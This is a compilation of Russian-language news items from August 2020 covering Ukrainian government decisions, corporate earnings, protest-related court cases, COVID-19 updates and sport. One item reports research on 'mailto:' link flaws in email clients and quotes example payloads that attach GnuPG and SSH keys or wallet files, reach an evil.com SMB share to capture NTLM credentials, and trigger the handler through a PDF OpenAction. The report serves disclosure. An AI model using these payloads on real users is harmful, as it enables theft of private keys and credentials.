Премьер-министр Украины Денис Шмыгаль поручил Министерству здравоохранения разработать рекомендации для безопасного проведения очередных местных выборов 25 октября.
Об этом он заявил во время заседания Кабинета Министров, передает RegioNews.
По его словам, правительство уже сейчас начинает работу для того, чтобы избирательный процесс в октябре прошел безопасно.
 
Премьер-министр добавил, что соответствующие рекомендации необходимо передать в Центральную избирательную комиссию и на места.
Читайте также: Коронавирус в Украине: хроника (обновляется)
Напомним, в Украине по состоянию на 19 августа зафиксирован новый антирекорд по числу больных Covid-19, за сутки заболели 1967 человек.
 
Источники

Датский конгломерат A.P. Moeller-Maersk заявил о более высокой, нежели прогнозировали аналитики, квартальной прибыли благодаря снижению цен на топливо, сокращению издержек и повышению тарифов на перевозки.
Так, чистая прибыль составила $427 млн по сравнению с $141 млн годом ранее, тогда как аналитики в среднем прогнозировали $281 млн. Выручка, в свою очередь, сократилась на 6,5% г/г и составила $9 млрд против ожидаемых $8,77 млрд, а прибыль до уплаты процентов налогов и амортизации оказалась на уровне $1,7 млрд.
Стоит отметить, что компания пересмотрела свои прогнозы на весь текущий год. Ожидается, что показатель EBITDA составит порядка $6-7 млрд, хотя ранее прогнозировалось $5,5 млрд.
 
Источники

В Харьковской области масштабный пожар охватил продуктовый магазин "Посад" в поселке Сахновщина, пламя охватило и соседнее здание.
Об этом сообщили в пресс-службе ГСЧС Украины, передает RegioNews.
 
К тушению привлечены 30 человек личного состава и шесть единиц техники ДСНС. Жертв и пострадавших нет.
Как отмечают очевидцы, на месте пожара слышны были взрывы.
Напомним, 15 августа произошел пожар в Хустской районной больнице на Закарпатье. Из-за пожара пришлось эвакуировать 200 человек, из которых 160 - пациенты.
 
Источники

Набсовет "Сбербанка" рассмотрит вопрос о распределении прибыли за 2019 год и рекомендациях по размеру выплачиваемых дивидендов на заседании 21 августа. Об этом говорится в материалах банка.
В повестку заседания также включены вопросы о&nbsp;рассмотрении изменений в устав "Сбербанка", а также назначении новой даты годового общего собрания акционеров.
17 марта 2020 года набсовет "Сбербанка"&nbsp;утвердил 15 кандидатов для избрания&nbsp;в наблюдательный совет на годовом общем собрании акционеров 24 апреля. Однако из-за пандемии Covid-2019 ГОСА было отложено на неопределенный срок.
 
Источники

Во время празднования 29-й годовщины независимости Украины и Дня Государственного Флага в Киеве состоится ряд торжественных, культурных и спортивных событий.
Об этом сообщает пресс-служба КГГА, передает RegioNews.
Согласно утвержденному плану празднования, с 21 августа по 20 ноября на Майдане Независимости проведут выставочный проект ко Дню Героев Небесной Сотни "Век несокрушимых".
23 августа у здания Киевского городского совета и в районах города проведут торжественные церемонии поднятия Государственного Флага Украины.
24 августа проведут молебны за Украину и украинский народ. В районах города в этот день возложат цветы к памятникам, памятным знакам и местам захоронений выдающихся деятелей украинского государства.
24 августа запланированы торжественные мероприятия с участием руководства государства и города.
В КГГА напомнили, что накануне Дня Государственного Флага откроют сооружение флагштока для самого высокого, главного Флага Украины. Традиционно, по случаю праздника центральную часть столицы украсят праздничной иллюминацией.
Кроме этого, 23-24 августа возможно временное ограничение движения транспортных средств на время подготовки и проведения праздничных мероприятий в центральной части города.
В Киеве также будут проходить разнообразные культурные мероприятия. В частности, с 20 августа по 4 сентября в Национальном историко-архитектурном музее "Киевская крепость" будет работать фотовыставка ко Дню Независимости "Украина моя".
23 августа в парке имени Тараса Шевченко все желающие смогут посетить творческий фестиваль "С Украиной в сердце".
А 24 августа состоится видеоекскурс "Украина, ты нужна мне" в Центральной библиотеке им. Т. Г. Шевченко для детей г. Киев.
Напомним, в Киевской области решили ограничить проведение религиозных праздников, власти области провели онлайн-встречу с представителями духовенства.
 
Источники

Президент Владимир Зеленский назначил уполномоченного Антимонопольного комитета (АМКУ). Им стала Ольга Музыченко.
Как сообщает RegioNews, соответствующий указ опубликован на сайте Офиса президента.
В указе говорится: «Назначить Музыченко Ольгу Валерьевну государственным уполномоченным Антимонопольного комитета Украины».
Известно, что 28 июля Музыченко подала декларацию кандидата на должность первого заместителя председателя — госуполномоченного Антимонопольного комитета. Должность первого заместителя председателя АМКУ освободилась после назначения Ольги Пищанской председателем комитета в июле.
Напомним, 16 июля Рада назначила Ольгу Песчанскую главой антимонопольного комитета, до этого она исполняла обязанности председателя АМКУ.
 
Источники

Группа QIWI обновила&nbsp;свой прогноз на 2020 год, сообщила компания.
Как ожидается, общая чистая выручка вырастет на 7-15% в сравнении с 2019 годом.
Как ожидается, чистая выручка в сегменте платежных сервисов увеличится в пределах от -3% до 10% в сравнении с 2019 годом.
Как ожидается, скорректированная чистая прибыль вырастет на 35-50% в сравнении с 2019 годом.
 
Источники

Исследователи из Рурского университета в Бохуме (Германия) проанализировали (PDF) поведение почтовых клиентов при обработке ссылок "mailto:" с расширенными параметрами. Пять из двадцати рассмотренных почтовых клиентов оказались уязвимы для атаки, манипулирующей подстановкой ресурсов при помощи параметра "attach". Ещё шесть почтовых клиентов были подвержены атаке по замене ключей PGP и S/MIME, а три клиента оказались уязвимы для атаки по извлечению содержимого зашифрованных сообщений.
Ссылки "mailto:" применяются для автоматизации открытия почтового клиента с целью написания письма заданному в ссылке адресату. Кроме адреса в составе ссылки можно указать дополнительные параметры, такие как тема письма и шаблон типового содержимого. Предложенная атака манипулирует параметром "attach", позволяющем прикрепить к создаваемому письму вложение.
Почтовые клиенты Thunderbird, GNOME Evolution (CVE-2020-11879), KDE KMail (CVE-2020-11880), IBM/HCL Notes (CVE-2020-4089) и Pegasus Mail оказались уязвимы тривиальной атаке, позволяющей автоматически прикрепить любой локальный файл, указанный через ссылку вида "mailto:?attach=путь_к_файлу". Файл прикрепляется без вывода предупреждения, поэтому без специального акцентирования внимания пользователь может не заметить, что письмо будет отправлено с прикреплением вложением.
Например, при помощи ссылки вида "mailto:?to=user@example.com&subject=Title&body=Text&attach=~/.gnupg/secring.gpg" можно подставить в письмо закрытые ключи от GnuPG. Также можно отправить содержимое криптокошельков (~/.bitcoin/wallet.dat), SSH-ключи (~/.ssh/id_rsa) и любые доступные пользователю файлы. Более того, Thunderbird позволяет прикреплять группы файлов по маске при помощи конструкций вида "attach=/tmp/*.txt".
Кроме локальных файлов некоторые почтовые клиенты обрабатывают ссылки на сетевые хранилища и пути в IMAP-сервере. В частности, IBM Notes позволяет передать файл из сетевого каталога при обработке ссылок вида "attach=&#92;&#92;evil.com&#92;dummyfile", а также перехватить параметры аутентификации NTLM направив ссылку на SMB-сервер, подконтрольный атакующему (запрос будет отправлен с текущими параметрами аутентификации пользователя).
Thunderbird успешно обрабатывает запросы вида "attach=imap:///fetch&gt;UID&gt;/INBOX&gt;1/", позволяющие прикрепить содержимое из папок на IMAP-сервере. При этом извлекаемые из IMAP письма, зашифрованные через OpenPGP и S/MIME, автоматически расшифровываются Thunderbird перед отправкой. Разработчики Thunderbird были уведомлены о проблеме в феврале и в ветке Thunderbird 78 проблема решена (ветки Thunderbird 52, 60 и 68 остаются уязвимыми).
Старые версии Thunderbird оказались уязвимы и для двух других вариантов атаки на PGP и S/MIME, предложенных исследователями. В частности, к Thunderbird, а также к OutLook, PostBox, eM Client, MailMate и R2Mail2 оказалась применима атака по замене ключей, вызванная тем, что почтовый клиент автоматически импортирует и устанавливает новые сертификаты, передаваемые в сообщениях S/MIME, что позволяет атакующему организовать подмену уже сохранённых у пользователя открытых ключей.
Вторая атака, которой подвержены Thunderbird, PostBox и MailMate, манипулирует особенностями механизма автосохранения черновиков сообщений и позволяет при помощи параметров mailto инициировать расшифровку зашифрованных сообщений или добавление цифровой подписи для произвольных сообщений, с последующей передачей результата на IMAP-сервер атакующего. Шифротекст при данной атаке передаётся через парметр "body", а для инициирования обращения к IMAP-серверу атакующего применяется тег "meta refresh". Например: '&lt;meta http-equiv="refresh" content="60; URL=mailto:?body=-----BEGIN PGP MESSAGE-----[...]-----END PGP MESSAGE-----"&gt;'
Для автоматической обработки ссылок "mailto:" без участия пользователя могут применяться специально оформленные документы PDF - действие OpenAction в PDF позволяет автоматически запустить обработчик mailto при открытии документа: %PDF-1.5 1 0 obj &lt;&lt; /Type /Catalog /OpenAction [2 0 R] &gt;&gt; endobj 2 0 obj &lt;&lt; /Type /Action /S /URI/URI (mailto:?body=-----BEGIN PGP MESSAGE-----[...])&gt;&gt; endobj
 
Источники

Ленинский районный суд Владивостока рассмотрел дело местной активистки Екатерины Васильевой, обвиняемой в неповиновении требованию сотрудника полиции (ст. 19.3 КоАП), и прекратил его в связи с отсутствием состава правонарушения. Об этом сообщают в телеграм-канале «ТОР».
Васильеву задержали 15 августа по дороге на митинг в поддержку хабаровчан. Она рассказала, что два человека без формы преследовали ее от дома, затем сотрудники полиции задержали ее в автобусе и отвезли в отделение. Там девушку удерживали два часа. Когда она покинула отделение и пыталась уехать со знакомыми, полиция заблокировала ее в машине. Затем Васильеву отвезли в суд.
На активистку составили протокол по статье о неповиновении требованию сотрудника полиции (ст. 19.3 КоАП). И еще один — по статье о нарушении порядка проведения публичного мероприятия (ч. 5 ст. 20.2 КоАП) — за участие в митинге 18 июля. Суд перенес рассмотрение дела по первому протоколу на 19 августа.
Защите удалось доказать, что 15 августа Васильева ушла из отделения на законных основаниях, суд счел ее невиновной. Суд за участие в митинге назначен на 18 сентября.
С 11 июля жители Хабаровского края и многих других регионов России проводят акции в поддержку губернатора Сергея Фургала. Шествие 11 июля по улицам Хабаровска к зданию краевого правительства, по разным оценкам, собрало от 5 до 35 тысяч человек. Полиция примерно до 18 июля почти не препятствовала участникам акций. Однако после этого силовики начали задерживать участников акций в Хабаровске, Владивостоке, Комсомольске-на-Амуре, Красноярске, Москве, Омске и других городах.
Действующего на тот момент губернатора Хабаровского края Сергея Фургала 9 июля задержали сотрудники ФСБ по подозрению в причастности к ряду заказных убийств. Его доставили в Москву, где по решению Басманного районного суда Москвы поместили под стражу до 9 сентября. 16 июля Мосгорсуд отклонил апелляционную жалобу защиты Фургала и признал это решение законным. 20 июля президент Владимир Путин подписал указ об отставке Фургала с поста губернатора и назначил на этот пост временно исполняющим обязанности однопартийца Фургала по ЛДПР Михаила Дегтярева, передавала «Медиазона».
 
Источники

Центральный районный суд Новосибирска оштрафовал на 10 тысяч рублей участника пикета в поддержку Хабаровска Петра Кокушева и прекратил дело Андрея Кайгородцева, активиста, выступающего с пикетом на ту же тему. Об этом сообщает «МБХ медиа».
Оба активиста провели акции 18 июля. Кокошуев стоял с плакатом в поддержку хабаровчан на площади Ленина. Тогда полицейский вынес ему предупреждение, но, по словам самого оштрафованного, предупреждение касалось не плаката, а отсутствия намордника у собаки, которая была с активистом. Кроме того, полиция считает, что активист проводил пикет больше часа. Сам Кокошуев утверждает, что находился на площади около 15-20 минут.
В действиях Кайгородцева, который стоял с плакатом «Я/Мы Хабаровск. Новосибирск с вами» поодаль от массовой акции, суд не нашел состава правонарушения. Обоим пикетчикам полиция вменяла нарушения правил проведения публичного мероприятия (ч. 5 ст. 20.2 КоАП).
С 11 июля жители Хабаровского края проводят акции в поддержку экс-губернатора Сергея Фургала. Шествие 11 июля по улицам Хабаровска к зданию краевого правительства, по разным оценкам, собрало от 5 до 35 тысяч человек.
Действующего на тот момент губернатора Хабаровского края Сергея Фургала 9 июля задержали сотрудники ФСБ по подозрению в причастности к ряду заказных убийств. Его доставили в Москву, где по решению Басманного районного суда Москвы поместили под стражу до 9 сентября. 16 июля Мосгорсуд отклонил апелляционную жалобу защиты Фургала и признал это решение законным. 20 июля президент Владимир Путин подписал указ об отставке Фургала с поста губернатора и назначил на этот пост временно исполняющим обязанности однопартийца Фургала по ЛДПР Михаила Дегтярева, передавала «Медиазона».
 
Источники

Ленинский районный суд Владивостока рассмотрел дело местной активистки Екатерины Васильевой, обвиняемой в неповиновении требованию сотрудника полиции (ст. 19.3 КоАП), и прекратил его в связи с отсутствием состава правонарушения. Об этом сообщают в телеграм-канале «ТОР».
Васильеву задержали 15 августа по дороге на митинг в поддержку хабаровчан. Она рассказала, что два человека без формы преследовали ее от дома, затем сотрудники полиции задержали ее в автобусе и отвезли в отделение. Там девушку удерживали два часа. Когда она покинула отдел и пыталась уехать со знакомыми, полиция заблокировала ее в машине. Затем Васильеву отвезли в суд.
На активистку составили протокол по статье о неповиновении требованию сотрудника полиции (ст. 19.3 КоАП). И еще один — по статье о нарушении порядка проведения публичного мероприятия (ч. 5 ст. 20.2 КоАП) — за участие в митинге 18 июля. Суд перенес рассмотрение дела по первому протоколу на 19 августа.
Защите удалось доказать, что 15 августа Васильева ушла из отделения на законных основаниях, суд счел ее невиновной. Суд за участие в митинге назначен на 18 сентября.
С 11 июля жители Хабаровского края и многих других регионов России проводят акции в поддержку губернатора Сергея Фургала. Шествие 11 июля по улицам Хабаровска к зданию краевого правительства, по разным оценкам, собрало от 5 до 35 тысяч человек. Полиция примерно до 18 июля почти не препятствовала участникам акций. Однако после этого силовики начали задерживать участников акций в Хабаровске, Владивостоке, Комсомольске-на-Амуре, Красноярске, Москве, Омске и других городах.
Действующего на тот момент губернатора Хабаровского края Сергея Фургала 9 июля задержали сотрудники ФСБ по подозрению в причастности к ряду заказных убийств. Его доставили в Москву, где по решению Басманного районного суда Москвы поместили под стражу до 9 сентября. 16 июля Мосгорсуд отклонил апелляционную жалобу защиты Фургала и признал это решение законным. 20 июля президент Владимир Путин подписал указ об отставке Фургала с поста губернатора и назначил на этот пост временно исполняющим обязанности однопартийца Фургала по ЛДПР Михаила Дегтярева, передавала «Медиазона».
 
Источники

Мультисистемный воспалительный синдром (MIS-C) у детей, переболевших коронавирусом, представляет собой отдельное заболевание и отличается от синдрома Кавасаки, с которым его связывали ранее, следует из научной статьи британских ученых.
«Характеристики нашей когорты и наблюдаемые нами изменения иммунных клеток показывают, что MIS-C, вероятно, будет отдельным иммунопатологическим заболеванием, связанным с более тяжелым заболеванием SARS-CoV-2 у серопозитивных детей. Механизмы, лежащие в основе этих иммунных нарушений, являются приоритетными для дальнейших исследований», ‒ говорится в результатах исследования, пишут «Ведомости».
В ходе исследования ученые изучили историю болезни 25 детей от 7 до 14 лет, которые перенесли тяжелую форму коронавирусной инфекции с апреля по май. После выздоровления у них в той или иной форме проявился посткоронавирусный синдром, по симптоматике походивший на синдром Кавасаки.
Для синдрома Кавасаки характерны конъюнктивит, воспаление слизистой оболочки полости рта и губ, отеки конечностей, полиморфная сыпь и увеличение шейных лимфатических узлов. Однако ученые выяснили, что лишь у двоих пациентов были такие симптомы. У остальных же наблюдались нетипичные для синдрома Кавасаки признаки, включая расстройство желудочно-кишечного тракта и нарушения в работе сердца. Кроме того, изменения состава крови детей и уровня активности различных иммунных клеток также были нехарактерными.
Число случаев коронавируса в мире превысило 22.1 млн. Более 781 тысячи человек умерли, выздоровели 14 млн.
 
Источники

Городской голова Александр Сенкевич назвал высказывание главврача Николаевского центра лечения инфекционных заболеваний Светланы Федоровой о неготовности больниц Николаева к приему больных COVID-19 «эмоционально-политической информацией».
Об этом он сообщил в эфире программы "Добрый вечер" на ТРК НІС-ТВ, информирует RegioNews.
В передаче речь шла о том, что главврач областной инфекционной больницы Светлана Федорова заявила, что городские больницы, которые называются "госпитальные помещения под COVID-19", которые специально зарезервированы, не готовы к приему больных.
В свою очередь Александр Сенкевич заподозрил, что данное высказывание главврача имеет прямое отношение к предстоящей предвыборной гонке.
 
Напомним, 13 августа мэра Николаева Сенкевича вызвали на допрос в полицию касательно транспортной стратегии города.
 
Источники

Второй по величине в США ритейлер товаров для дома Lowe's представил финансовые результаты за второй фискальный квартал, согласно которым чистая прибыль увеличилась с $1,68 млрд или $2,14 на акцию годом ранее до $2,83 млрд или $3,74 на бумагу. Скорректированная прибыль, тем временем, оказалась на уровне $3,75 в расчете на одну акцию, в то время как аналитики прогнозировали $2,92 на бумагу.
Заметим, что выручка компании увеличилась на 30,1% г/г и достигла $27,3 млрд, что также оказалось выше прогнозов в $24,32 млрд. Сообщается, что сопоставимые продажи возросли на 34,2% г/г против консенсус-прогноза в 16,3% г/г.
Примечательно, что с начала года акции Lowe's подорожали на 31,9%.
 
Источники

В Полесске местный житель избил металлической трубой бывшую возлюбленную, которая живёт в соседнем доме. Об этом сообщает пресс-служба регионального УМВД.
Женщина возвращалась домой и случайно встретилась с экс-бойфрендом. Вспыхнула ссора, горожанка начала оскорблять мужчину. Тот схватил лежащую на земле металлическую трубу и несколько раз ударил бывшую даму сердца. Пострадавшая обратилась в больницу, медики диагностировали у неё перелом лопатки, что является средней тяжести вредом здоровью.
Злоумышленника задержали. Возбуждено уголовное дело по п. "з" ч. 2 ст. 112 УК РФ ("Умышленное причинение средней тяжести вреда здоровью с применением оружия или предметов, используемых в качестве оружия"). Жителю Полесска грозит до трёх лет лишения свободы.
В Калининграде местный житель ворвался в квартиру соседей и ранил ножом родителей и двоих детей, обвинив их в шуме.
 
Источники

Сам глава Запорожской ОГА Виталий Боговин будет идти первым номером в областной совет
Трансляцию мероприятия вела «Слуга народа» на своей странице в Facebook, сообщает RegioNews.
Имена членов команды, которые пойдут на выборы, озвучил Михаил Федоров, министр цифровой трансформации Украины и руководитель Запорожской областной ячейки «Слуг народа».
Кроме фамилий Тишечко и Боговина в списке первой десятки в запорожский облсовет — чиновники ОГА, предприниматели, а также руководитель и члены местного штаба партии.
 
Напомним, 12 августа «Слуга народа» определилась с кандидатом в мэры Кропивницкого.
 
Источники

Прибыль МТС, относящаяся к акционерам компании, во 2 квартале 2020 года по МСФО снизилась на 7,5% г/г - до 11,8 млрд рублей, сообщила компания.
Выручка выросла на 1,3% - до 117,7 млрд рублей.
Показатель OIBDA&nbsp;увеличился на 0,6% - до 51,6 млрд рублей.
Чистый долг / LTM Скорректированная OIBDA&nbsp;составил 1,3х против 1,4х годом ранее.
 
Источники

Азиатский венчурный фонд АФК "Система" - Sistema Asia Fund продал долю в индийской онлайн-аптеке Netmeds, сообщила корпорация.
В рамках сделки фармацевтический стартап приобрела компания Reliance Retail Ventures Limited.
Фонд Sistema&nbsp;Asia&nbsp;Fund&nbsp;впервые инвестировал в Netmeds&nbsp;в 2017 году. Как отметили в компании, выход из этой инвестиции принесет его инвесторам высокую доходность благодаря росту фармацевтического стартапа в четыре раза за прошедшие три года. Эта сделка станет второй монетизацией для Sistema&nbsp;Asia&nbsp;Fund&nbsp;после продажи доли в Qwikcilver&nbsp;в марте 2019 года. В этом году АФК "Система" рассчитывает осуществить последние инвестиции через свой первый азиатский фонд, размер которого составляет $120 млн.
 
Источники

Дороги, которые находятся на содержании местных властей, являются слабыми местами для многих городов Украины.
Об этом заявил президент Владимир Зеленский во время визита в Запорожье, передает RegioNews.
 
Зеленский также добавил, что в 2021 году запланировано восстановление большого количества мостов по всей Украине в рамках программы «Большая стройка».
По словам президента, будет разработан соответствующий план восстановления и реконструкции, под который будут подготовлены и выделены средства.
Напомним, 19 августа президент Зеленский прибыл с рабочим визитом в Запорожскую область. В ходе визита он заявил, что СБУ будет контролировать вес фур на дорогах, а контролирующий орган нуждается в перезагрузке.
 
Источники

Премьер-министр Украины Денис Шмигаль поручил Министерству здравоохранения и Министерству образования провести проверки школ и детских садов на соблюдение безопасных условий обучения в период карантина.
Об этом он сказал во время заседания правительства, передает RegioNews.
По его словам, проверка школ и детских садов является приоритетной задачей правительства и местной власти.
 
Он отметил, что "надо четко объяснить, где какие угрозы, потому что безопасность детей, родителей и учителей – это главный приоритет в этом учебном году".
 
Ранее сообщалось, что премьер-министр Украины Денис Шмигаль поручил Министерству здравоохранения разработать рекомендации для безопасного проведения очередных местных выборов 25 октября.
 
Источники

Местные выборы являются завершающим этапом реформы децентрализации. На их проведение в октябре предусмотрено 2,3 млрд гривен.
Об этом заявил премьер-министр Денис Шмигаль во время заседания Кабинета министров Украины, передает RegioNews.
 
Ранее сообщалось, что Шмыгаль поручил подготовиться к безопасному проведению местных выборов.
 
Источники

Компания Huawei подтвердила, что Android-устройства ее производства по-прежнему будут получать обновления функционала и патчи безопасности.
Как сообщалось ранее, 13 августа нынешнего года истек срок действия временной генеральной лицензии - распоряжения правительства США, разрешающего американским компаниям осуществлять некоторые торговые операции с китайским техногигантом. В связи с этим у пользователей смартфонов Huawei возник вопрос, будут ли они и впредь получать обновления от Google.
Как сообщили представители Huawei порталу Huawei Central, компания продолжит обновлять свои смартфоны (в том числе Honor) с предустановленным магазином приложений Google Play и Huawei Mobile Services.
"Наши пользователи продолжат получать обновления ПО и сервисов благодаря силе опенсорсного сообщества и нашим собственным передовым R&D-возможностям. На устройствах с предустановленным Google Play загруженные из Google Play приложения и другие приложения от Google продолжат получать обновления. На устройствах без Google Play управлять новыми приложениями и обновлениями можно будет через предустановленный сервис Huawei AppGallery", - сообщили представители Huawei.
В прошлые месяцы Huawei добавила свои мобильные устройства (в том числе Honor) в ежемесячный и ежеквартальный бюллетень обновлений. Практически все устройства в этой секции поддерживают Huawei Mobile Services: серия Huawei P40; серия Huawei Mate 30; серия Huawei Nova 7; Honor 30.
 
Источники

Из-за разминирования немецкой баржи, затонувшей под Балтийском, отдыхающих попросили не ходить на пляж в районе  ул. Батарейной пос. Мечниково. Об этом пишет "Вестник "Балтийска" в среду, 19 августа.
Местных жителей и туристов просят также не трогать найденные боеприпасы. В случае их обнаружения необходимо связаться с Единой диспетчерской службой (89506711289) или позвонить по номеру 112.
В Балтийске судам запретили приближаться к затопленной немецкой барже, которую начали разминировать. Работы продлятся до 18 сентября. По предварительным подсчётам на борту находится около семи тысяч авиабомб, фугасов и фаустпатронов.
 
Источники

Также правительством будет предложено внести в государственную целевую программу проект по строительству аэропорта в Мукачево.
Об этом во время вступительного слова перед заседанием Кабмина заявил премьер-министр Денис Шмигаль, пишет RegioNews со ссылкой на УНИАН.
 
Также премьер добавил, что будет предложено внести в государственную целевую программу проект по строительству аэропорта в Мукачево.
Напомним, сегодня же премьер-министр Украины Денис Шмигаль поручил Министерству здравоохранения и Министерству образования провести проверки школ и детских садов на соблюдение безопасных условий обучения в период карантина.
 
Источники

Служба безопасности Украины разоблачила и блокировала деятельность межрегионального центра минимизации налоговых платежей, который "обслуживал" крупных сельхозпроизводителей из нескольких областей страны.
Как передает RegioNews, об этом сообщили в пресс-центре спецслужбы.
В рамках досудебного расследования установлено, что организатором центра является киевский бизнесмен, который занимается реализацией топлива. Он создал ряд фиктивных фирм, через которые, используя физических лиц предпринимателей, реализовывал топливо за наличные
 
Известно, что бухгалтеры изготавливали документацию для фиктивной продажи топлива клиентам центра. Это позволяло "покупателям" противоправно минимизировать уплату налогов в государственный бюджет. Так, по документации горючее реализовывали по завышенным ценам, что искусственно и существенно увеличивало затраты аграриев на выращивание и сбор сельхозпродукции.
Среди клиентов центра - крупные частные и государственные агропромышленные предприятия.
По предварительным подсчетам, в течение 2019-2020 годов фигуранты уголовного производства "помогли" аграриям в формировании незаконного налогового кредита по НДС на более 12 миллионов гривен. Организаторы центра получали за свои "услуги" 5-6% от суммы.
Правоохранители провели шесть одновременных обысков на Житомирщине, Киевщине и в столице. Изъята оргтехника со сформированными документами, первичную бухгалтерскую документацию и черновые записи дельцов.
В рамках уголовного производства по ч. 3 ст. 212 (умышленное уклонение от уплаты налогов или сборов, если они привели к фактическому непоступлению в бюджеты или государственные целевые фонды средств в особо крупных размерах) Уголовного кодекса Украины продолжаются следственные действия.
Напомним, СБУ разоблачила межрегиональную группу, которая выводила в тень миллионы гривен госпредприятий. Ежемесячно банда "отмывала" почти полмиллиарда гривен.
 
Источники

Спикер Верховной рады Украины Дмитрий Разумков подписал распоряжение о созыве внеочередной сессии на 25 августа. Заседание начнется в 11:00.
Как пишет RegioNews, об этом говорится в сообщении на сайте парламента.
Отмечается, что на внеочередной сессии рассмотрят изменения в государственный бюджет на 2020, в частности, касающиеся роста уровня минимальной зарплаты. Также на 25 августа запланирована ратификация меморандума с Европейским союзом о предоставлении кредита.
Кроме того, Рада планирует ратифицировать соглашение с Европейским инвестиционным банком о строительстве дорог и развитие трансъевропейской транспортной сети.
В сообщении говорится, что Рада также объявит конкурс на лучший эскиз большого Государственного герба Украины.
Ранее Разумков рассказал, что изменения в Избирательный кодекс могут быть приняты до выборов.
 
Источники

В Киеве и еще шести регионах из-за высокого уровня загруженности коек пациентами с COVID-19 будут развернуты дополнительные места.
Об этом во время брифинга сообщил главный санитарный врач Украины Виктор Ляшко, передает RegioNews.
По его словам, существенное увеличение загрузки коек зафиксировано в Киеве, а также в Винницкой, Волынской, Закарпатской, Ивано-Франковской, Ровенской и Тернопольской областях.
Он добавил, что во время очередного заседания Государственной комиссии по вопросам техногенно-экологической безопасности и чрезвычайных ситуаций было рассмотрено состояние дел в больницах первой волны всех областей Украины.
 
Читайте также: Коронавирус в Украине: хроника (обновляется)
Напомним, в Украине по состоянию на 19 августа зафиксирован новый антирекорд по числу больных Covid-19, за сутки заболели 1967 человек.
 
Источники

'''ГК "ФИНАМ" провела исследование инвестиционной привлекательности акций Activision Blizzard. Сильный баланс и хорошие темпы прироста выручки во II квартале 2020 года, а также развитие мобильного сегмента игр и сегмента eSports, благоприятно скажутся на капитализации эмитента. Аналитики рекомендуют "Покупать" акции компании с целевой ценой $95, потенциал роста - 12,7%. '''
Activision Blizzard (ATVI) - один из ведущих мировых производителей видеоигр. Игротека компании включает несколько сотен наименований, в том числе такие бестселлеры, как Call of Duty, Warcraft, StarCraft, Diablo и другие. В настоящее время игровая аудитория компании превышает 400 млн пользователей.
Производитель видеоигр продемонстрировал сильные финансовые результаты по итогам II квартала 2020 года, несмотря на разгар "коронакризиса". "Скорректированная выручка подскочила на 72,2% (г/г), до $2,08 млрд, на фоне резкого увеличения спроса на видеоигры в период локдаунов, введенных по всему миру, и превзошла как собственный прогноз менеджмента компании в размере $1,675 млрд, так и консенсус-прогноз на уровне $1,70 млрд", - говорится в исследовании. Аналитики обращают внимание, что цифровые продажи обеспечили свыше 85% общей выручки.
Хорошие результаты во II квартале 2020 года продемонстрировали ведущие франшизы Activision Blizzard, включая Overwatch, World of Warcraft, Call of Duty Mobile, Candy Crush: "Скорректированный показатель EBITDA подскочил почти в три раза, до $992 млн, а скорректированная прибыль на акцию взлетела на 155,3%, до 97 центов, и оказалась существенно выше средней оценки аналитиков на уровне 69 центов".
Преимуществом Activision Blizzard является сильный баланс: по итогам II квартала на счетах имелось $6,34 млрд денежных средств при долгосрочном долге $2,68 млрд. "В январе-июне Activision Blizzard сгенерировала операционный денежный поток в объеме $916 млн (рост на 51,7% (г/г)), направив $32 млн на капвложения и $316 млн - на дивидендные выплаты", - отмечается в аналитической записке.
Activision Blizzard продолжает экспансию в мобильном сегменте: уже началось тестирование Diablo Immortal - мобильной версии культовой франшизы. В скором времени следует также ожидать релиза новой игры в сегменте King Digital. Еще одним ключевым направлением менеджмент эмитента считает развитие индустрии eSports. Компания прилагает значительные усилия по популяризации киберспорта и уверенно превращает его в развлечение, доступное максимально широкой аудитории. Аналитики ГК "ФИНАМ" положительно оценивают меры, принятые Activision Blizzard по расширению своего присутствия в сегменте мобильных игр, а также планы по дальнейшей экспансии в перспективном сегменте киберспорта.
В исследовании отмечается, что большинство сотрудников Activision Blizzard продолжают работать удаленно. Впрочем, руководство компании твердо намерено выпустить в срок все намеченные на этот год игры.
Проведенная в 2019 году масштабная реструктуризация бизнеса позволила Activision Blizzard сосредоточить усилия на наиболее перспективных с точки зрения руководства направлениях за счет сокращения финансирования не оправдавших себя проектов. При этом, благодаря мерам по оптимизации затрат, компания сохранила хорошие показатели рентабельности, отмечают аналитики.
 
Источники

«Барселона» назначила Рональда Кумана новым главным тренером команды. Об этом сообщается в микроблоге клуба в Twitter.
Контракт с голландским специалистом заключен до конца июня 2022 года. Финансовые условия соглашения не уточняются.
17 августа «Барселона» уволила с поста главного тренера испанца Кике Сетьена. Причиной такого решения руководства клуба стало поражение «Барселоны» в четвертьфинале Лиги чемпионов от «Баварии» со счетом 2:8.
До этого 57-летний Куман был тренером сборной Нидерландов, которую он возглавил в 2018 году. Он также работал в английских «Эвертоне», «Саутгемптоне», голландских ПСВ и «Аяксе», испанской «Валенсии».
 
Источники

Кабинет министров планирует расширить программу помощи по частичной безработице. Помощь будут оказывать безработным на период карантинов из-за других болезней, а не только из-за COVID-19.
Как сообщает RegioNews, об этом в Telegram написал премьер-министр Денис Шмыгаль.
По его словам, на период нынешнего карантина программа помогла уже почти 400 тысячам украинцам сохранить свои рабочие места, а работодателям – свой бизнес.
 
Ранее сообщалось, что в Украине уже пол миллиона безработных: 51% имеют высшее образование.
 
Источники

«Ростелеком» совместно с Waves Enterprise разрабатывают систему дистанционного электронного голосования (ДЭГ) по заданию Центральной избирательной комиссии России. Система ДЭГ основана на результатах научно-исследовательской работы, программных и технических решениях российского производства, включая блокчейн-платформу, которая входит в единый реестр российского ПО, сообщает РБК. О создании такой системы также рассказали ForkLog представители Waves Enterprise.
Первое технологическое тестирование системы прошло 7 августа 2020 года. 31 августа состоится публичное тестирование. По решению ЦИК России технология ДЭГ будет использоваться 13 сентября на дополнительных выборах депутатов Государственной думы седьмого созыва в Курской и Ярославской областях.
Система призвана обеспечить безопасность доступа, надежность обработки информации, конфиденциальность, а также контроль над процедурой голосования всеми авторизованными участниками выборов, включая независимых наблюдателей.
Система не будет полной заменой традиционного голосования, это дополнительный способ волеизъявления, подчеркнула председатель ЦИК Элла Памфилова.
Напомним, технологию блокчейн использовали на голосовании по поправкам в Конституцию РФ. Тогда система несколько раз давала сбой, а позже в даркнет попала база из 1,1 млн паспортов участников блокчейн-голосования.
 
Источники

Американский ритейлер Target зафиксировал более высокую, нежели прогнозировали аналитики, квартальную прибыль.
Так, чистая прибыль во втором квартале составила $1,69 млрд или $3,35 на акцию по сравнению с $938 млн или $1,82 на бумагу годом ранее. В то же время, скорректированная прибыль оказалась на уровне $3,38 на акцию, превысив прогнозы рынка в $1,63 на бумагу.
